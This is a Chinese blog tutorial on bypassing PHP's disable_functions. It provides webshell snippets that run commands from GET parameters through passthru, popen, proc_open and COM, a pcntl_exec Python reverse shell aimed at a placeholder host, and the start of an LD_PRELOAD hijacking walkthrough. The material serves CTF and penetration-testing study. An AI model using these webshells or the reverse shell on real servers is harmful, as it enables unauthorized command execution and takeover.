<!DOCTYPE HTML>
<html lang="zh-CN">


<head><meta name="generator" content="Hexo 3.9.0">
    <meta charset="utf-8">
    <meta name="keywords" content="绕过disable_functions, Ash up up">
    <meta name="baidu-site-verification" content="fmlEuI34ir">
    <meta name="google-site-verification" content="yCy2azpds5XSuGZvis6OuA-XIGF5GuGpYRAaGfD6o48">
    <meta name="360-site-verification" content="b7c11a830ef90fd1464ad6206bb7b6e7">
    <meta name="description" content="Bypass disable_functions的方法#前提背景什么是disable_functions:是php.ini中的一个设置选项，可以用来设置PHP环境禁止使用某些函数，通常是网站管理员为了安全起见，用来禁用某些危险的命令执行函数">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <title>绕过disable_functions | Ash</title>
    <link rel="icon" type="image/png" href="/medias/favicon.png">

    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/matery.css">
    <link rel="stylesheet" type="text/css" href="/css/my.css">
    <style type="text/css">
        
    </style>

    <script src="/libs/jquery/jquery-2.2.0.min.js"></script>
    <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
    <script>
        var _hmt = _hmt || [];
        (function () {
            var hm = document.createElement("script");
            hm.src = "https://hm.baidu.com/hm.js?ce84511d3df71640a9378a69f6293044";
            var s = document.getElementsByTagName("script")[0];
            s.parentNode.insertBefore(hm, s);
        })();
    </script>

    
        <script>
            (function(){
                var bp = document.createElement('script');
                var curProtocol = window.location.protocol.split(':')[0];
                if (curProtocol === 'https') {
                    bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
                }
                else {
                    bp.src = 'http://push.zhanzhang.baidu.com/push.js';
                }
                var s = document.getElementsByTagName("script")[0];
                s.parentNode.insertBefore(bp, s);
            })();
        </script>
    

    <script>
        (function(){
        var src = "https://jspassport.ssl.qhimg.com/11.0.1.js?d182b3f28525f2db83acfaaf6e696dba";
        document.write('<script src="' + src + '" id="sozz"><\/script>');
        })();
    </script>

<style type="text/css" lang="css">
    #loading-container{
        position: fixed;
        top: 0;
        left: 0;
        min-height: 100vh;
        width: 100vw;
        z-index: 9999;
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
        background: #FFF;
        text-align: center;
        /* loader页面消失采用渐隐的方式*/
        -webkit-transition: opacity 1s ease;
        -moz-transition: opacity 1s ease;
        -o-transition: opacity 1s ease;
        transition: opacity 1s ease;
    }
    .loading-image{
        width: 120px;
        height: 50px;
        transform: translate(-50%);
    }
    
    .loading-image div:nth-child(2) {
        -webkit-animation: pacman-balls 1s linear 0s infinite;
        animation: pacman-balls 1s linear 0s infinite
    }

    .loading-image div:nth-child(3) {
        -webkit-animation: pacman-balls 1s linear .33s infinite;
        animation: pacman-balls 1s linear .33s infinite
    }

    .loading-image div:nth-child(4) {
        -webkit-animation: pacman-balls 1s linear .66s infinite;
        animation: pacman-balls 1s linear .66s infinite
    }

    .loading-image div:nth-child(5) {
        -webkit-animation: pacman-balls 1s linear .99s infinite;
        animation: pacman-balls 1s linear .99s infinite
    }
    
   .loading-image div:first-of-type {
        width: 0;
        height: 0;
        border: 25px solid #49b1f5;
        border-right-color: transparent;
        border-radius: 25px;
        -webkit-animation: rotate_pacman_half_up .5s 0s infinite;
        animation: rotate_pacman_half_up .5s 0s infinite;
    }
    .loading-image div:nth-child(2) {
        width: 0;
        height: 0;
        border: 25px solid #49b1f5;
        border-right-color: transparent;
        border-radius: 25px;
        -webkit-animation: rotate_pacman_half_down .5s 0s infinite;
        animation: rotate_pacman_half_down .5s 0s infinite;
        margin-top: -50px;
    }
    @-webkit-keyframes rotate_pacman_half_up {0% {transform: rotate(270deg)}50% {transform: rotate(1turn)}to {transform: rotate(270deg)}}

    @keyframes rotate_pacman_half_up {0% {transform: rotate(270deg)}50% {transform: rotate(1turn)}to {transform: rotate(270deg)}}

    @-webkit-keyframes rotate_pacman_half_down {0% {transform: rotate(90deg)}50% {transform: rotate(0deg)}to {transform: rotate(90deg)}}

    @keyframes rotate_pacman_half_down {0% {transform: rotate(90deg)}50% {transform: rotate(0deg)}to {transform: rotate(90deg)}}
    
    @-webkit-keyframes pacman-balls {75% {opacity: .7}to {transform: translate(-100px, -6.25px)}}

    @keyframes pacman-balls {75% {opacity: .7}to {transform: translate(-100px, -6.25px)}}
    
   
    .loading-image div:nth-child(3),
    .loading-image div:nth-child(4),
    .loading-image div:nth-child(5),
    .loading-image div:nth-child(6){
        background-color: #49b1f5;
        width: 15px;
        height: 15px;
        border-radius: 100%;
        margin: 2px;
        width: 10px;
        height: 10px;
        position: absolute;
        transform: translateY(-6.25px);
        top: 25px;
        left: 100px;
    }
    .loading-text{
        margin-bottom: 20vh;
        text-align: center;
        color: #2c3e50;
        font-size: 2rem;
        box-sizing: border-box;
        padding: 0 10px;
        text-shadow: 0 2px 10px rgba(0,0,0,0.2);
    }
    @media only screen and (max-width: 500px) {
         .loading-text{
            font-size: 1.5rem;
         }
    }
    .fadeout {
        opacity: 0;
        filter: alpha(opacity=0);
    }
    /* logo出现动画 */
    @-webkit-keyframes fadeInDown{0%{opacity:0;-webkit-transform:translate3d(0,-100%,0);transform:translate3d(0,-100%,0)}100%{opacity:1;-webkit-transform:none;transform:none}}
    @keyframes fadeInDown{0%{opacity:0;-webkit-transform:translate3d(0,-100%,0);}}
 </style>
 <script>
(function () {
    const loaded = function(){
       setTimeout(function(){
            const loader = document.getElementById("loading-container");
            loader.className="fadeout" ;//使用渐隐的方法淡出loading page
            // document.getElementById("body-wrap").style.display="flex";
            setTimeout(function(){
                loader.style.display="none";
            },1000); 
        },1000);//强制显示loading page 1s  
    };
    loaded();
})()
 </script>
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"><style type="text/css" lang="css">
    #loading-container{
        position: fixed;
        top: 0;
        left: 0;
        min-height: 100vh;
        width: 100vw;
        z-index: 9999;
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
        background: #FFF;
        text-align: center;
        /* loader页面消失采用渐隐的方式*/
        -webkit-transition: opacity 1s ease;
        -moz-transition: opacity 1s ease;
        -o-transition: opacity 1s ease;
        transition: opacity 1s ease;
    }
    .loading-image{
        width: 120px;
        height: 50px;
        transform: translate(-50%);
    }
    
    .loading-image div:nth-child(2) {
        -webkit-animation: pacman-balls 1s linear 0s infinite;
        animation: pacman-balls 1s linear 0s infinite
    }

    .loading-image div:nth-child(3) {
        -webkit-animation: pacman-balls 1s linear .33s infinite;
        animation: pacman-balls 1s linear .33s infinite
    }

    .loading-image div:nth-child(4) {
        -webkit-animation: pacman-balls 1s linear .66s infinite;
        animation: pacman-balls 1s linear .66s infinite
    }

    .loading-image div:nth-child(5) {
        -webkit-animation: pacman-balls 1s linear .99s infinite;
        animation: pacman-balls 1s linear .99s infinite
    }
    
   .loading-image div:first-of-type {
        width: 0;
        height: 0;
        border: 25px solid #49b1f5;
        border-right-color: transparent;
        border-radius: 25px;
        -webkit-animation: rotate_pacman_half_up .5s 0s infinite;
        animation: rotate_pacman_half_up .5s 0s infinite;
    }
    .loading-image div:nth-child(2) {
        width: 0;
        height: 0;
        border: 25px solid #49b1f5;
        border-right-color: transparent;
        border-radius: 25px;
        -webkit-animation: rotate_pacman_half_down .5s 0s infinite;
        animation: rotate_pacman_half_down .5s 0s infinite;
        margin-top: -50px;
    }
    @-webkit-keyframes rotate_pacman_half_up {0% {transform: rotate(270deg)}50% {transform: rotate(1turn)}to {transform: rotate(270deg)}}

    @keyframes rotate_pacman_half_up {0% {transform: rotate(270deg)}50% {transform: rotate(1turn)}to {transform: rotate(270deg)}}

    @-webkit-keyframes rotate_pacman_half_down {0% {transform: rotate(90deg)}50% {transform: rotate(0deg)}to {transform: rotate(90deg)}}

    @keyframes rotate_pacman_half_down {0% {transform: rotate(90deg)}50% {transform: rotate(0deg)}to {transform: rotate(90deg)}}
    
    @-webkit-keyframes pacman-balls {75% {opacity: .7}to {transform: translate(-100px, -6.25px)}}

    @keyframes pacman-balls {75% {opacity: .7}to {transform: translate(-100px, -6.25px)}}
    
   
    .loading-image div:nth-child(3),
    .loading-image div:nth-child(4),
    .loading-image div:nth-child(5),
    .loading-image div:nth-child(6){
        background-color: #49b1f5;
        width: 15px;
        height: 15px;
        border-radius: 100%;
        margin: 2px;
        width: 10px;
        height: 10px;
        position: absolute;
        transform: translateY(-6.25px);
        top: 25px;
        left: 100px;
    }
    .loading-text{
        margin-bottom: 20vh;
        text-align: center;
        color: #2c3e50;
        font-size: 2rem;
        box-sizing: border-box;
        padding: 0 10px;
        text-shadow: 0 2px 10px rgba(0,0,0,0.2);
    }
    @media only screen and (max-width: 500px) {
         .loading-text{
            font-size: 1.5rem;
         }
    }
    .fadeout {
        opacity: 0;
        filter: alpha(opacity=0);
    }
    /* logo出现动画 */
    @-webkit-keyframes fadeInDown{0%{opacity:0;-webkit-transform:translate3d(0,-100%,0);transform:translate3d(0,-100%,0)}100%{opacity:1;-webkit-transform:none;transform:none}}
    @keyframes fadeInDown{0%{opacity:0;-webkit-transform:translate3d(0,-100%,0);}}
 </style>
 <script>
(function () {
    const loaded = function(){
       setTimeout(function(){
            const loader = document.getElementById("loading-container");
            loader.className="fadeout" ;//使用渐隐的方法淡出loading page
            // document.getElementById("body-wrap").style.display="flex";
            setTimeout(function(){
                loader.style.display="none";
            },1000); 
        },1000);//强制显示loading page 1s  
    };
    loaded();
})()
 </script>
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head>



 <div id="loading-container">
     <p class="loading-text">玩命加载中 . . . </p> 
     <div class="loading-image">
         <div></div>
         <div></div>
         <div></div>
         <div></div> 
         <div></div>
     </div>
 </div><body>

    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                  <div>
                    
                    <span class="logo-span">Ash</span>
                   </div>
	</a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fa fa-navicon"></i></a>
<ul class="right">
    
    <li class="hide-on-med-and-down">
        <a href="/" class="waves-effect waves-light">
            
            <i class="fa fa-home"></i>
            
            <span>首页</span>
        </a>
    </li>
    
    <li class="hide-on-med-and-down">
        <a href="/tags" class="waves-effect waves-light">
            
            <i class="fa fa-tags"></i>
            
            <span>标签</span>
        </a>
    </li>
    
    <li class="hide-on-med-and-down">
        <a href="/categories" class="waves-effect waves-light">
            
            <i class="fa fa-bookmark"></i>
            
            <span>分类</span>
        </a>
    </li>
    
    <li class="hide-on-med-and-down">
        <a href="/archives" class="waves-effect waves-light">
            
            <i class="fa fa-archive"></i>
            
            <span>归档</span>
        </a>
    </li>
    
    <li class="hide-on-med-and-down">
        <a href="/about" class="waves-effect waves-light">
            
            <i class="fa fa-user-circle-o"></i>
            
            <span>关于</span>
        </a>
    </li>
    
    <li class="hide-on-med-and-down">
        <a href="/contact" class="waves-effect waves-light">
            
            <i class="fa fa-comments"></i>
            
            <span>留言板</span>
        </a>
    </li>
    
    <li>
        <a href="#searchModal" class="modal-trigger waves-effect waves-light">
            <i id="searchIcon" class="fa fa-search" title="搜索"></i>
        </a>
    </li>
</ul>

<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <div class="logo-name">Ash</div>
        <div class="logo-desc">
            
            渗透测试
            
        </div>
    </div>

    

    <ul class="menu-list mobile-menu-list">
        
        <li>
            <a href="/" class="waves-effect waves-light">
                
                <i class="fa fa-fw fa-home"></i>
                
                首页
            </a>
        </li>
        
        <li>
            <a href="/tags" class="waves-effect waves-light">
                
                <i class="fa fa-fw fa-tags"></i>
                
                标签
            </a>
        </li>
        
        <li>
            <a href="/categories" class="waves-effect waves-light">
                
                <i class="fa fa-fw fa-bookmark"></i>
                
                分类
            </a>
        </li>
        
        <li>
            <a href="/archives" class="waves-effect waves-light">
                
                <i class="fa fa-fw fa-archive"></i>
                
                归档
            </a>
        </li>
        
        <li>
            <a href="/about" class="waves-effect waves-light">
                
                <i class="fa fa-fw fa-user-circle-o"></i>
                
                关于
            </a>
        </li>
        
        <li>
            <a href="/contact" class="waves-effect waves-light">
                
                <i class="fa fa-fw fa-comments"></i>
                
                留言板
            </a>
        </li>
        
        
    </ul>
</div>

        </div>

        
    </nav>

</header>

    



<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/16.jpg')">
    <div class="container">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <div class="description center-align post-title">
                        绕过disable_functions
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>



<main class="post-container content">

    
    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        width: 345px;
        padding-left: 20px;
        background-color: rgb(255, 255, 255,0.7);
        border-radius: 10px;
        box-shadow: 0 10px 35px 2px rgba(0, 0, 0, .15), 0 5px 15px rgba(0, 0, 0, .07), 0 2px 5px -5px rgba(0, 0, 0, .1) !important;
    }

    .toc-widget .toc-title {
        margin: 35px 0 15px 0;
        padding-left: 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #toc-content .is-active-link::before {
        background-color: #42b983;
    }

    #floating-toc-btn {
        position: fixed;
        right: 20px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }

    #floating-toc-btn .btn-floating {
        width: 48px;
        height: 48px;
    }

    #floating-toc-btn .btn-floating i {
        line-height: 48px;
        font-size: 1.4rem;
    }
</style>
<div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                        <a href="/tags/web安全/" target="_blank">
                            <span class="chip bg-color">web安全</span>
                        </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fa fa-bookmark fa-fw icon-category"></i>
                        
                        <a href="/categories/web安全/" class="post-category" target="_blank">
                            web安全
                        </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                <div class="post-date info-break-policy">
                    <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2021-10-06
                </div>

                <div class="post-author info-break-policy">
                    <i class="fa fa-user-o fa-fw"></i>作者:&nbsp;&nbsp;
                    
                    Ash
                    
                </div>

                
                
                <div class="info-break-policy">
                    <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
                    9.6k
                </div>
                

                
                <div class="info-break-policy">
                    <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
                    40 分
                </div>
                
                

                
            </div>
        </div>
        <hr class="clearfix">
        <div class="card-content article-card-content">
            <div id="articleContent">
                <h1 id="Bypass-disable-functions的方法"><a href="#Bypass-disable-functions的方法" class="headerlink" title="Bypass disable_functions的方法"></a>Bypass disable_functions的方法</h1><h3 id="前提背景"><a href="#前提背景" class="headerlink" title="#前提背景"></a>#前提背景</h3><p>什么是disable_functions:是php.ini中的一个设置选项，可以用来设置PHP环境禁止使用某些函数，通常是网站管理员为了安全起见，用来禁用某些危险的命令执行函数等。</p>
<p>打开我phpstudy启动的服务，因为我没有设置过php.ini，所以我的disable_functions是空的</p>
<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211003110917282.png" alt="image-20211003110917282"></p>
<p>再来看看什么是php.ini：最直接影响PHP 功能的配置文件   。那么自然而言我们就可以在php.ini里面设置禁用一些函数来看看</p>
<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211003111416409.png" alt="image-20211003111416409"></p>
<p>注意：eval并非PHP函数，放在disable_functions中是无法禁用的，若要禁用需要用到PHP的扩展Suhosin。详细的eval与assert这个我会在命令执行里面提到</p>
<p>禁用这4个来看看phpinfo里面的效果(别忘了重启服务)</p>
<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211003111755116.png" alt="image-20211003111755116"></p>
<p>可以看到，但是当我们上传webshell的时候，却因为disable_functions而无法执行里面的命令，那么我们就需要去绕过</p>
<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211003114008625.png" alt="image-20211003114008625"></p>
<p>直接就上传不了，当然</p>
<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211006193257373.png" alt="image-20211006193257373"></p>
<p>出现ret=127也是函数被禁用的原因了</p>
<h3 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h3><p>黑名单顾名思义就是找到不在它禁用的范围里面</p>
<p>函数有很多</p>
<pre><code>system,assert,passthru,exec,pcntl_exec,shell_exec,popen,proc_open...等等</code></pre><p>详细的可以看我写的命令执行和代码执行的一些函数</p>
<p>比如system</p>
<pre><code>    &lt;?php
    highlight_file(__FILE__);
    system('dir');
    system('whoami');
    ?&gt;</code></pre><p>被禁用后</p>
<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211003115633534.png" alt="image-20211003115633534"></p>
<h4 id="pcntl-exec"><a href="#pcntl-exec" class="headerlink" title="pcntl_exec"></a>pcntl_exec</h4><p>利用条件:需要开启pcntl扩展(可以在phpinfo上面搜索pcntl，如果有单独的说明开了这个模块)</p>
<p>安装扩展的方法：<a href="https://www.zixuephp.net/article-429.html" target="_blank" rel="noopener">https://www.zixuephp.net/article-429.html</a></p>
<p>pcntl_exec()是pcntl（linux下面的一个扩展）插件专有的命令执行函数来执行系统命令函数，可以在当前进程空间执行指定的程序。</p>
<p>存在扩展的情况</p>
<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211003175633489.png" alt="image-20211003175633489"></p>
<pre><code>#exec.php
&lt;?php pcntl_exec(“/bin/bash”, array(“/tmp/123.sh”));?&gt;

#/tmp/123.sh
#!/bin/bash
ls -l /</code></pre><p>这个pcntl_exec就去执行/tmp目录下的123.sh</p>
<p>但是pcntl_exec是没有回显的，我们就可以利用它去执行反弹shell</p>
<pre><code>&lt;?php pcntl_exec("/usr/bin/python3",array('-c','import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM,socket.SOL_TCP);s.connect(("x.x.x.x",port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'));</code></pre><p><a href="https://whoamianony.top/2020/12/21/CTF比赛记录/第四届“蓝帽杯”全国大学生网络安全技能大赛决赛WriteUp/#php" target="_blank" rel="noopener">[第四届“蓝帽杯”决赛]php</a> 这道题利用的就是这个点</p>
<h4 id="passthru"><a href="#passthru" class="headerlink" title="passthru"></a>passthru</h4><pre><code>    &lt;?php
    highlight_file(__FILE__);
    $command = $_GET['cmd']
    passthru($command); //直接输出结果
    ?&gt;</code></pre><h4 id="popen"><a href="#popen" class="headerlink" title="popen"></a>popen</h4><pre><code>&lt;?php
highlight_file(__FILE__);
$command=$_GET['command'];
$fd = popen($command, 'r'); 
while($s=fgets($fd)){
    print_r($s);
}
?&gt;</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211003194559929.png" alt="image-20211003194559929"></p>
<h4 id="proc-open"><a href="#proc-open" class="headerlink" title="proc_open"></a>proc_open</h4><pre><code>&lt;?php
    highlight_file(__FILE__);
    $command=$_GET['command'];
    $descriptorspec=array( 
        0=&gt;array('pipe','r'), 
        1=&gt;array('pipe','w'),
        2=&gt;array('pipe','w') 
    );
    $handle=proc_open($command,$descriptorspec,$pipes,NULL);
    if(!is_resource($handle)){
        die('proc_open failed');
    }
    while($s=fgets($pipes[1])){
        print_r($s);
    }
    while($s=fgets($pipes[2])){
        print_r($s);
    }
    fclose($pipes[0]);
    fclose($pipes[1]);
    fclose($pipes[2]);
    proc_close($handle);
?&gt;</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211003194806934.png" alt="image-20211003194806934"></p>
<h4 id="com组件"><a href="#com组件" class="headerlink" title="com组件"></a>com组件</h4><p>这个需要添加扩展才行（PHP&gt;5.4），找到php.ini文件，添加extension=php_com_dotnet.dll，php_com_dotnet 只在 window 系统中有效</p>
<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211003224707326.png" alt="image-20211003224707326"></p>
<p>phpstudy里面也可以添加</p>
<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211003200306260.png" alt="image-20211003200306260"></p>
<p>打开phpinfo</p>
<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211003225300468.png" alt="image-20211003225300468"></p>
<p>enable之后，就可以使用如下脚本了</p>
<p>ps:在这卡了2个多小时，之前phpstudy2017问题，没有指定dll文件，安装后也不行一直报错，后来换了小皮的phpstudy发现也不行，一直磨啊磨，后来才发现是单词拼错了，太菜了……</p>
<pre><code>&lt;?php
highlight_file(__FILE__);
$command=$_GET['cmd'];
$wsh = new COM('WScript.shell'); //// 生成一个COM对象　Shell.Application也能
$exec = $wsh-&gt;exec("cmd /c ".$command); //调用对象方法来执行命令
$stdout = $exec-&gt;StdOut();
$stroutput = $stdout-&gt;ReadAll();
echo $stroutput;
?&gt;</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211003225637972.png" alt="image-20211003225637972"></p>
<p>总结：disable_funtions总有限制不全的时候，多观察哪些没有被限制，从而去利用</p>
<h3 id="利用Linux环境变量LD-PRELOAD"><a href="#利用Linux环境变量LD-PRELOAD" class="headerlink" title="利用Linux环境变量LD_PRELOAD"></a>利用Linux环境变量LD_PRELOAD</h3><p>原理：</p>
<p><code>**LD_PRELOAD**</code> 是 Linux 系统的一个环境变量，它可以影响程序的运行时的链接（Runtime linker），它可以在用户的程序运行前优先加载该动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，可以利用此功能来使用自定义的函数，而另一方面，可以向别人的程序注入程序，从而达到特定的攻击目的</p>
<p>总的来说：这个函数指定的动态链接库文件，会在其它文件调用之前先被调用，借此可以达到劫持的效果，并且劫持系统函数，从而达到不调用php命令执行函数，仍然可以执行系统命令。</p>
<p>在Linux中，动态链接库的后缀名通常用.so 表示；在Windows系统中，动态链接库的后缀名为.dll</p>
<p>前提条件：</p>
<ul>
<li>需要能上传.so的文件 (so文件就是常说的动态链接库)</li>
<li>能够控制环境变量的值（设置LD_PRELOAD变量），比如putenv，mail函数</li>
<li>因为新进程启动将加载 <code>LD_PRELOAD</code> 中的 <code>.so</code> 文件，所以要存在可以控制 PHP 启动外部程序的函数并能执行，比如 <code>mail()</code>、<code>imap_mail()</code>、<code>mb_send_mail()</code> 和 <code>error_log()</code> 函数等,也就是说能够调用动态链接库</li>
</ul>
<h4 id="简单例子"><a href="#简单例子" class="headerlink" title="简单例子"></a>简单例子</h4><p>结合例子来理解这个怎么做到劫持：</p>
<p>在下面的例子之前如果对共享库不理解可以看看这篇</p>
<p><a href="https://cloud.tencent.com/developer/article/1683012" target="_blank" rel="noopener">Linux共享库、静态库、动态库详解</a></p>
<p>首先我们自己创建一个生成随机10个数的代码</p>
<p>random.c </p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;time.h></span></span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">srand</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span><span class="token punctuation">(</span>i<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>我们先编译运行一下看看效果</p>
<pre><code>gcc random.c -o random</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211004135639016.png" alt="image-20211004135639016"></p>
<p>接着再去编一个，只返回66数值  随便去一个random1.c</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token keyword">int</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token number">66</span><span class="token punctuation">;</span>    
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这时候把他们编译成动态共享库</p>
<pre><code>gcc -shared -fPIC random1.c  -o random1.so  </code></pre><p><a href="https://blog.csdn.net/itworld123/article/details/117587091?utm_medium=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-1.no_search_link&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-1.no_search_link" target="_blank" rel="noopener">对于-fPIC的理解</a>  我的简单理解就是实现真正意义上的共享吧</p>
<pre><code>export LD_PRELOAD="./random1.so"</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211004141353031.png" alt="image-20211004141353031"></p>
<p>再来ldd看看先后顺序</p>
<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211004141542678.png" alt="image-20211004141542678"></p>
<p>可以看到程序执行的时候优先执行了我们动态链接库，实现了劫持的功能</p>
<h4 id="劫持getuid"><a href="#劫持getuid" class="headerlink" title="劫持getuid()"></a>劫持getuid()</h4><p>原理:</p>
